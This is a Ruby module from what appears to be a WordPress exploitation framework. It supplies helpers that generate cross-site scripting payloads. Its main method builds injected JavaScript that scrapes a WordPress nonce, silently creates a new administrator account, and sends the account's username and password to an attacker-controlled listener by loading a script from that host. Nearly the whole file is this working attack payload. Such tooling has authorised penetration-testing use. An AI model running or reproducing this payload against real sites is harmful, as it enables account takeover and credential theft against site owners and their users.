# Provides helper methods for generating scripts for XSS attacks.
module Wpxf::WordPress::Xss
  include Wpxf
  include Wpxf::Net::HttpServer

  # Initialize a new instance of {Xss}.
  def initialize
    super

    register_options([
      StringOption.new(
        name: 'xss_host',
        desc: 'The address of the host listening for a connection',
        required: true
      ),
      StringOption.new(
        name: 'xss_path',
        desc: 'The path to access via the cross-site request',
        default: Utility::Text.rand_alpha(8),
        required: true
      )
    ])
  end

  # @return [String] the address of the host listening for a conneciton.
  def xss_host
    normalized_option_value('xss_host')
  end

  # @return [String] the path to make cross-site requests to.
  def xss_path
    normalized_option_value('xss_path')
  end

  # @return [String] the full URL to make cross-site requests to.
  def xss_url
    "http://#{xss_host}:#{http_server_bind_port}/#{xss_path}"
  end

  # @return [String] a script that will create a new admin user and post the
  #   credentials back to {#xss_url}.
  def wordpress_js_create_user
    username = Utility::Text.rand_alpha(6)
    password = Utility::Text.rand_alpha(10)

    %Q|
      #{js_ajax_download}
      #{js_ajax_post}

      var create_user = function () {
        var nonce = this.responseText.match(/id="_wpnonce_create-user" name="_wpnonce_create-user" value="([a-z0-9]+)"/i)[1];
        var data = new FormData();

        data.append('action', 'createuser');
        data.append('_wpnonce_create-user', nonce);
        data.append('_wp_http_referer', '#{wordpress_url_new_user}');
        data.append('user_login', '#{username}');
        data.append('email', '#{Utility::Text.rand_alpha(7)}@#{Utility::Text.rand_alpha(10)}.com');
        data.append('pass1', '#{password}');
        data.append('pass2', '#{password}');
        data.append('role', 'administrator');

        postInfo("#{wordpress_url_new_user}", data, function () {
          var a = document.createElement("script");
          a.setAttribute("src", "#{xss_url}?u=#{username}&p=#{password}");
          document.head.appendChild(a);
        });
      };

      ajax_download({
        path: "#{wordpress_url_new_user}",
        cb: create_user
      });
    |
  end
end
